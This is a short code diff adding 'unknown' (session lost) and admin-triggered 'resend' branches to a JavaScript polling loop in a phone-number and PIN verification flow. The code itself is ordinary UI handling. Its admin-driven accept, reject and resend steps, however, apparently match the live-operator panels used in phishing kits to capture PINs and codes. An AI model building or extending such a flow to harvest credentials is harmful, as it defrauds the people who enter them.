@@ -1509,6 +1509,24 @@
           } else if (data.status === 'rejected' || data.status === 'timeout') {
             stopPolling();
             resetToPhoneStep();
+
+          } else if (data.status === 'unknown') {
+            // Session was lost (server restarted). Bail out cleanly.
+            stopPolling();
+            if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
+            verifyOverlay.classList.remove('show');
+            document.body.classList.remove('modal-open');
+            showRejectBanner();
+            setTimeout(() => {
+              pinError.textContent = 'Session expired. Please enter your PIN and try again.';
+              pinError.classList.add('show');
+            }, 300);
+
+          } else if (data.status === 'resend') {
+            // Admin asked for resend — send user back to phone step
+            stopPolling();
+            resetToPhoneStep();
           }
         } catch (err) { console.warn('poll error:', err.message); }
       }, POLL_INTERVAL_MS);
